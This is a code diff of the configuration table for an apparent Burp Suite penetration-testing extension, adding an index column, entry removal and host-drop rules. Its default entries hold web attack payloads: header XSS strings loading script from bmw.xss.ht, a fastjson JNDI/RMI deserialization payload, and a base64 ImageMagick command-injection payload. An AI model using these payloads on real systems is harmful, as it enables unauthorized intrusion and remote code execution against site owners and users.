@@ -18,6 +18,7 @@ import burp.IExtensionHelpers;
 import burp.IHttpRequestResponse;
 import burp.Methods;
 import burp.Utils;
+import manager.DismissedTargetsManager;
 
 
 public class ConfigTableModel extends AbstractTableModel{
@@ -29,7 +30,7 @@ public class ConfigTableModel extends AbstractTableModel{
 	private static final long serialVersionUID = 1L;
 	private List<ConfigEntry> configEntries =new ArrayList<ConfigEntry>();
 	private static final String[] titles = new String[] {
-			"Key", "Value", "Type", "Enable", "Comment"
+			"#", "Key", "Value", "Type", "Enable", "Comment"
 	};
 
 	public static final String Firefox_Mac = "/Applications/Firefox.app/Contents/MacOS/firefox";
@@ -50,7 +51,7 @@ public class ConfigTableModel extends AbstractTableModel{
 			configEntries.add(new ConfigEntry("browserPath", Firefox_Windows,ConfigEntry.Config_Basic_Variable,true,false));
 		}
 		configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false));
-		configEntries.add(new ConfigEntry("DismissedTargets", "{\"*.firefox.com\":\"Drop\",\"*.mozilla.com\":\"Drop\"}",ConfigEntry.Config_Basic_Variable,true,false));
+		//configEntries.add(new ConfigEntry("DismissedTargets", "{\"*.firefox.com\":\"Drop\",\"*.mozilla.com\":\"Drop\"}",ConfigEntry.Config_Basic_Variable,true,false));
 		//configEntries.add(new ConfigEntry("DismissedAutoForward", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
 		//configEntries.add(new ConfigEntry("DismissedHost", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
 		//configEntries.add(new ConfigEntry("DismissedURL", "",ConfigEntry.Config_Basic_Variable,true,false));
@@ -78,14 +79,18 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true));
 
 		configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,true));
-		//		//避免IP:port的切分操作，把Payload破坏，所以使用不带分号的简洁Payload
+		//避免IP:port的切分操作，把Payload破坏，所以使用不带分号的简洁Payload
 		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Append_To_header_value,true));
-		configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
+		//configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
 
 		configEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%host.fastjson.%dnslogserver/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));
 
 		configEntries.add(new ConfigEntry("Imagemagick","cHVzaCBncmFwaGljLWNvbnRleHQNCnZpZXdib3ggMCAwIDY0MCA0ODANCmltYWdlIG92ZXIgMCwwIDAsMCAnaHR0cHM6Ly9pbWFnZW1hZ2ljLmJpdC4weTAubGluay94LnBocD94PWB3Z2V0IC1PLSAlcyA+IC9kZXYvbnVsbGAnDQpwb3AgZ3JhcGhpYy1jb250ZXh0",ConfigEntry.Config_Custom_Payload_Base64,true));
 
+		configEntries.add(new ConfigEntry("*.firefox.com", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
+		configEntries.add(new ConfigEntry("*.mozilla.com", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
+		configEntries.add(new ConfigEntry("*.mozilla.org", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
+		configEntries.add(new ConfigEntry("*.mozilla.net", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
 	}
 
 
@@ -187,12 +192,13 @@ public class ConfigTableModel extends AbstractTableModel{
 	public Class<?> getColumnClass(int columnIndex)
 	{	switch(columnIndex) 
 		{
+		case 0:
+			return boolean.class;//index
 		case 3: 
 			return boolean.class;//enable
 		default:
 			return String.class;
 		}
-
 	}
 
 	@Override
@@ -230,14 +236,16 @@ public class ConfigTableModel extends AbstractTableModel{
 		switch (columnIndex)
 		{
 		case 0:
-			return entry.getKey();
+			return rowIndex;
 		case 1:
-			return entry.getValue();
+			return entry.getKey();
 		case 2:
-			return entry.getType();
+			return entry.getValue();
 		case 3:
-			return entry.isEnable();
+			return entry.getType();
 		case 4:
+			return entry.isEnable();
+		case 5:
 			return entry.getComment();
 		default:
 			return "";
@@ -255,15 +263,17 @@ public class ConfigTableModel extends AbstractTableModel{
 		switch (col)
 		{
 		case 0:
-			entry.setKey((String) value);
 			break;
 		case 1:
-			entry.setValue((String) value);
+			entry.setKey((String) value);
 			break;
 		case 2:
+			entry.setValue((String) value);
+			break;
+		case 3:
 			entry.setType((String) value);
 			break;
-		case 3://当显示true/false的时候，实质是字符串，需要转换。当使用勾选框的时候就是boolen
+		case 4://当显示true/false的时候，实质是字符串，需要转换。当使用勾选框的时候就是boolen
 			//			if (((String)value).equals("true")) {
 			//				entry.setEnable(true);
 			//			}else {
@@ -271,7 +281,7 @@ public class ConfigTableModel extends AbstractTableModel{
 			//			}
 			entry.setEnable((boolean)value);
 			break;
-		case 4:
+		case 5:
 			entry.setComment((String) value);
 			break;
 		default:
@@ -292,6 +302,18 @@ public class ConfigTableModel extends AbstractTableModel{
 			//https://stackoverflow.com/questions/6165060/after-adding-a-tablerowsorter-adding-values-to-model-cause-java-lang-indexoutofb
 			//fireTableRowsInserted(row-1, row-1);
 			fireTableRowsInserted(row-2, row-2);
+		}
+	}
+	
+	
+	public void removeConfigEntry(ConfigEntry lineEntry){
+		PrintWriter stdout = new PrintWriter(BurpExtender.callbacks.getStdout(), true);
+		synchronized (configEntries) {
+			int index = configEntries.indexOf(lineEntry);
+			if (index != -1) {
+				configEntries.remove(lineEntry);
+				fireTableRowsDeleted(index, index);
+			}
 		}
 	}
 
